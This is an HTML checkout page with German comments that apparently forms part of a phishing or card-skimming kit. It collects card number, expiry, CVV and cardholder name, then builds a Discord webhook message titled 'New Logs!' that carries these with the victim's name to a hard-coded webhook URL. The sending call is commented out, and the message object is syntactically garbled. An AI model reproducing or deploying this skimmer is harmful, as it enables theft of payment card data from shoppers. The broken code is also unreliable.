<head>

  <style>
    body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .checkout-container {
      width: 90%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.6);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      border: 1px solid rgba(255, 255, 255, 0.4);
      padding: 2rem;
      display: flex;
      flex-direction: column;
    }

    .progress-bar-wrapper {
      background: #e0e0e0;
      border-radius: 100px;
      height: 6px;
      width: 100%;
      margin-bottom: 1.5rem;
      overflow: hidden;
    }

    .progress-bar {
      height: 100%;
      width: 100%;
      background: linear-gradient(90deg, #007bff, #00d4ff);
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from { filter: drop-shadow(0 0 4px #007bff); }
      to { filter: drop-shadow(0 0 10px #00d4ff); }
    }

    h2 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.4rem;
      text-align: center;
    }

    .payment-method {
      display: flex;
      align-items: center;
      margin-bottom: 1rem;
    }

    .payment-method .logos {
      display: flex;
      gap: 0.4rem;
	  margin-left: auto;
    }

    .payment-method img {
      width: 35px;
      height: auto;
      filter: grayscale(0%);
      transition: filter 0.3s;
	  
    }

    .payment-method .active {
      filter: none;
	  width: 45px;
	  height: auto;
	  transition: width 0.2s;
    }

    .payment-method-text {
      margin-left: none;
      font-weight: bold;
    }

    .input-group {
      position: relative;
      margin-bottom: 1rem;
	  min-height: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 0.6rem 0.8rem 0.6rem 2.2rem;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
      box-sizing: border-box;
    }

    .input-group small {
      color: red;
      margin-top: 0.3rem;
      display: none;
    }

    .input-group.invalid input {
      border-color: red;
    }

    .input-group.invalid small {
      display: block;
    }

    .input-group .icon {
      position: absolute;
      right: 0.9rem;
      top: 1.2rem;
	  filter: grayscale(100%);
      transform: translateY(-50%);
      font-size: 0.9rem;
      color: #888;
    }

    .row {
      display: flex;
      gap: 1rem;
    }

    .row .input-group {
      flex: 1;
    }

    .next-button {
      margin-top: 2rem;
      width: 100%;
      background: #28a745;
      color: white;
      border: none;
      padding: 0.8rem 1rem;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s;
    }

    .next-button:hover {
      background: #1e7e34;
    }
	.next-button:disabled {
	  background: #aaa;
	  cursor: not-allowed;
	}
	
	.loader-overlay {
	  position: fixed;
	  top: 0;
	  left: 0;
	  width: 100%;
	  height: 100%;
	  background: rgba(255,255,255,0.8);
	  backdrop-filter: blur(4px);
	  display: flex;
	  justify-content: center;
	  align-items: center;
	  z-index: 999;
	  flex-direction: column;
	  visibility: hidden;
	  opacity: 0;
	  transition: opacity 0.3s ease;
	}

	.loader-overlay.active {
	  visibility: visible;
	  opacity: 1;
	}

	.loader {
	  border: 6px solid #e0e0e0;
	  border-top: 6px solid #28a745;
	  border-radius: 50%;
	  width: 50px;
	  height: 50px;
	  animation: spin 1s linear infinite;
	  margin-bottom: 1rem;
	}

	@keyframes spin {
	  to {
		transform: rotate(360deg);
	  }
	}

	.loader-text {
	  font-size: 1rem;
	  color: #333;
	  font-weight: 500;
	}


  </style>

  <div class="checkout-container">

    <div class="payment-method">
	  <div class="payment-method-text">Credit Card</div>
      <div class="logos">
        <img src="../main/img/visa.svg" id="visa" alt="" />
        <img src="../main/img/mastercard.svg" id="mastercard" alt="" />
        <img src="../main/img/maestro.svg" id="discover" alt="" />
		<img src="../main/img/amex.svg" id="amex" alt="" />
      </div>
      
    </div>

    <div class="input-group" id="card-number-group">
      <input type="text" id="card-number" placeholder="Card number" maxlength="19" />
	  <span class="icon">ðŸ”’</span>
      <small>Enter a valid card number</small>
    </div>

    <div class="row">
      <div class="input-group" id="expiry-group">
        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" />
        <small>Invalid date</small>
      </div>
      <div class="input-group">
        <input type="text" id="cvv" placeholder="CVV" maxlength="4" />
      </div>
    </div>

    <div class="input-group">
      <input type="text" id="card-name" placeholder="Cardholder Name" />
    </div>
	<p style="font-size: 0.85rem; text-align: center; margin-top: 1rem; margin-bottom: -1rem; color: #555;">

  <script>
    const cardInput = document.getElementById("card-number");
    const expiryInput = document.getElementById("expiry");
    const nameInput = document.getElementById("card-name");
    const cardGroup = document.getElementById("card-number-group");
    const expiryGroup = document.getElementById("expiry-group");

    // Karteninhaber automatisch aus LocalStorage
    const userData = JSON.parse(localStorage.getItem("checkoutData"));
    if (userData && userData.name) {
      nameInput.value = userData.name;
    }

    // Kartennummer Formatierung + Erkennung
    cardInput.addEventListener("input", e => {
      let value = e.target.value.replace(/\D/g, "").slice(0, 16);
      let formatted = value.replace(/(.{4})/g, "$1 ").trim();
      e.target.value = formatted;

      highlightCardProvider(value);
      validateCardNumber(value);
    });

    // Anbieter Highlight
    function highlightCardProvider(value) {
      const providers = {
        visa: /^4/,
        mastercard: /^5[1-5]/,
        amex: /^3[47]/,
        discover: /^6(?:011|5)/
      };

      for (let key in providers) {
        document.getElementById(key).classList.remove("active");
        if (providers[key].test(value)) {
          document.getElementById(key).classList.add("active");
        }
      }
    }

    // Luhn-Check
    function validateCardNumber(num) {
      const group = document.getElementById("card-number-group");
      const cleaned = num.replace(/\D/g, "");
      let sum = 0;
      let shouldDouble = false;

      for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned[i]);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }

      if (cleaned.length >= 13 && sum % 10 === 0) {
        group.classList.remove("invalid");
      } else {
        group.classList.add("invalid");
      }
    }

    // Ablaufdatum Formatierung
    expiryInput.addEventListener("input", e => {
      let val = e.target.value.replace(/\D/g, "").slice(0, 4);

      if (val.length === 1 && parseInt(val) > 1) {
        val = "0" + val;
      }

      if (val.length >= 2) {
        val = val.slice(0, 2) + " / " + val.slice(2);
      }

      e.target.value = val;

      validateExpiry(e.target);
    });

    // Backspace bei Slash
    expiryInput.addEventListener("keydown", e => {
      if (e.key === "Backspace") {
        const val = e.target.value;
        if (val.endsWith(" / ")) {
          e.preventDefault();
          e.target.value = val.slice(0, -3);
        }
      }
    });

    function validateExpiry(input) {
      const group = expiryGroup;
      const val = input.value.replace(/\s/g, '');
      if (!/^(\d{2})\/(\d{2})$/.test(val)) {
        group.classList.add("invalid");
        return;
      }

      const [_, mm, yy] = val.match(/^(\d{2})\/(\d{2})$/);
      const month = parseInt(mm);
      const year = parseInt("20" + yy);
      const today = new Date();
      const expiryDate = new Date(year, month - 1, 1);

      if (month < 1 || month > 12 || expiryDate < today) {
        group.classList.add("invalid");
      } else {
        group.classList.remove("invalid");
      }
    }

    function goToNextStep() {
	  const loader = document.getElementById("loader");

	  const cardNumber = document.getElementById("card-number").value;
	  const expiry = document.getElementById("expiry").value;
	  const cvv = document.getElementById("cvv").value;
	  const cardName = document.getElementById("card-name").value;

	  let contactData = JSON.parse(localStorage.getItem("contactData")) || {};
	  let checkoutData = JSON.parse(localStorage.getItem("checkoutData")) || {};

	  checkoutData.payment = {
		cardNumber,
		expiry,
		cvv,
		cardName
	  };

	  localStorage.setItem("checkoutData", JSON.stringify(checkoutData));

	  const webhookUrl = "https://discordapp.com/api/webhooks/1369387012054061098/5PeDGn87ArvRyRms-OxKyN1-4doQOwcjhcPHFj0EBRE_yOte59HJBOnUOll3TI37eREb";

	  const message = {
		  content: null,

			{
			  title: "**New Logs! :stuck_out_tongue: **",

			  fields: [

				  name: "**ðŸ“„ User Data**",
				  value:
					`- Firstname:  ${contactData.firstname || "N/A"}\n` +
					`- Lastname:   ${contactData.lastname || "N/A"}\n` +

				{

					`- Cardnumber:  ${checkoutData.payment.cardNumber || "N/A"}\n` +
					`- Expiry:              ${checkoutData.payment.expiry || "N/A"}\n` +
					`- CVV:                  ${checkoutData.payment.cvv || "N/A"}`,
				  inline: true
				}
			  ]
			}
		  ],
		  attachments: []
		};

	  //fetch(webhookUrl, {
		//method: "POST",
		//headers: {
		//  "Content-Type": "application/json"
		//},
		//body: JSON.stringify(message)
	  //}).catch(err => console.error("Webhook fehlgeschlagen", err));

	}



  </script>
  <script>
	  const cvvInput = document.getElementById("cvv");

	  const nameGroup = nameInput.parentElement;
	  const cvvGroup = cvvInput.parentElement;
	  const nextButton = document.querySelector(".next-button");

	  nameInput.addEventListener("input", () => {
		const valid = /^[A-Za-zÃ„Ã–ÃœÃ¤Ã¶Ã¼ÃŸ\s'-]+$/.test(nameInput.value.trim());
		toggleValidation(nameGroup, valid);
		checkAllFields();
	  });

	  cvvInput.addEventListener("input", () => {
		cvvInput.value = cvvInput.value.replace(/\D/g, "");
		const valid = /^[0-9]{3,4}$/.test(cvvInput.value);
		toggleValidation(cvvGroup, valid);
		checkAllFields();
	  });

	  function toggleValidation(group, valid) {
		if (valid) {
		  group.classList.remove("invalid");
		} else {
		  group.classList.add("invalid");
		}
	  }

	  function checkAllFields() {
		const nameValid = /^[A-Za-zÃ„Ã–ÃœÃ¤Ã¶Ã¼ÃŸ\s'-]+$/.test(nameInput.value.trim());
		const cvvValid = /^[0-9]{3,4}$/.test(cvvInput.value);
		const cardValid = !cardGroup.classList.contains("invalid");
		const expiryValid = !expiryGroup.classList.contains("invalid");

		if (nameValid && cvvValid && cardValid && expiryValid) {
		  nextButton.disabled = false;
		  nextButton.style.opacity = "1";
		  nextButton.style.pointerEvents = "auto";
		} else {
		  nextButton.disabled = true;
		  nextButton.style.opacity = "0.5";
		  nextButton.style.pointerEvents = "none";
		}
	  }

	  // Initial deaktivieren
	  nextButton.disabled = true;
	  nextButton.style.opacity = "0.5";
	  nextButton.style.pointerEvents = "none";
  </script>
